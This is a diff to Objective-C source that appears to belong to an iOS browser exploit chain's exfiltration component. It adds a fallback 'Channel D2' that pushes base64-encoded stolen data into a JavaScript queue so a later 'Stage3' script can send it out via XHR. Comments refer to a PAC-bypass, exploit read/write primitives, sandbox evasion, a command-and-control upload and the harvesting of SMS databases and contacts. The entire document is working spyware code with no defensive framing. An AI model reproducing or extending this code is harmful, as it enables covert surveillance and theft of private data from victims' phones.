@@ -17,15 +17,16 @@
  *     Blocked in WebContent (nsurlsessiond XPC denied by sandbox).
  *     Retained for non-WebContent environments without raw socket access.
  *
- *   Channel D — in-memory queue for Stage3 JS relay  [WEBCONTENT FALLBACK]
- *     When C/B/A all fail (typically because the process is inside WebContent
- *     and Stage3 did not call _process() on the active JS thread), the JSON
- *     body is base64-encoded and written into the exported globals
- *     g_cru_q_cnt / g_cru_q[].  Stage3_VariantB.js reads the queue after
- *     _process() returns and relays each item via its own fetch() — which
- *     IS permitted because it uses WebKit's internal networking XPC.
- *     Only items ≤ CRU_Q_B64MAX-1 bytes (base64) are queued; larger items
- *     (SMS DB, contacts) are deferred to the persistence stage.
+ *   Channel D2 — window.__d1_q push for Stage3 JS relay  [WEBCONTENT FALLBACK]
+ *     When C/B/A all fail, upload_beacon() pushes the base64-encoded JSON
+ *     body to window.__d1_q[] via [JSContext evaluateScript:].  Stage3 reads
+ *     this plain JS array after _process() returns and relays items via XHR.
+ *     Key advantage over the v1.5 cru_queue (D1) approach: Stage3 never calls
+ *     exploitPrimitive.read32 on g_cru_q[], which was found to corrupt the
+ *     PAC-bypass internal state after Pt() returns on iOS 15.4.1 (regression
+ *     introduced in v1.5; fixed in v1.7).
+ *     If JSContext is nil (e.g. background thread), falls back to cru_queue
+ *     for debug retention; Stage3 does not read cru_queue in v1.7+.
  */
 
 #import <Foundation/Foundation.h>
@@ -152,6 +153,39 @@ static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
     if (!g_saved_jsc) g_saved_jsc = ctx;
 
     NSString *script = jsc_fetch_script(body, uuid);
+    [ctx performSelector:evalSel withObject:script];
+    return true;
+}
+
+/*
+ * jsc_push_to_d2q — push base64-encoded JSON body to window.__d1_q[].
+ *
+ * Must be called from the JS execution thread (i.e. process() → upload_beacon()).
+ * Stage3_VariantB.js reads window.__d1_q after _process() returns and POSTs
+ * each item via XHR — WITHOUT using exploit primitives (read32/write32), so
+ * it cannot corrupt the PAC-bypass state after Pt() returns.
+ *
+ * Returns true if the script was evaluated (does NOT confirm XHR success).
+ * Returns false if no active JSContext is available (e.g. background thread).
+ */
+static bool jsc_push_to_d2q(NSData *body) {
+    Class jsCtxClass = NSClassFromString(@"JSContext");
+    if (!jsCtxClass) return false;
+
+    SEL currentSel = NSSelectorFromString(@"currentContext");
+    SEL evalSel    = NSSelectorFromString(@"evaluateScript:");
+    if (![jsCtxClass respondsToSelector:currentSel]) return false;
+
+    id ctx = [jsCtxClass performSelector:currentSel];
+    if (!ctx || ![ctx respondsToSelector:evalSel]) return false;
+
+    NSString *b64 = [body base64EncodedStringWithOptions:0];
+    if (!b64 || b64.length == 0) return false;
+
+    /* Base64 alphabet is [A-Za-z0-9+/=] — safe inside a JS single-quoted
+     * string literal with no escaping needed. */
+    NSString *script = [NSString stringWithFormat:
+        @"(window.__d1_q=window.__d1_q||[]).push('%@');", b64];
     [ctx performSelector:evalSel withObject:script];
     return true;
 }
@@ -489,11 +523,14 @@ void upload_beacon(void) {
             if (url) sent = nsurlsession_post(url, body, uuid);
         }
 
-        /* Channel D — queue for Stage3 relay (same rationale as upload_to_c2) */
+        /* Channel D2 — push to window.__d1_q via JSContext (JSC thread only).
+         * Stage3_VariantB.js relays the item via XHR without reading g_cru_q
+         * through exploit primitives, preventing PAC-bypass state corruption.
+         * Falls back to cru_queue for debug / future use if ctx is nil.      */
         if (!sent) {
-            NSString *b64body = [body base64EncodedStringWithOptions:0];
-            if (b64body) {
-                cru_queue_push(b64body.UTF8String);
+            if (!jsc_push_to_d2q(body)) {
+                NSString *b64body = [body base64EncodedStringWithOptions:0];
+                if (b64body) cru_queue_push(b64body.UTF8String);
             }
         }
     }
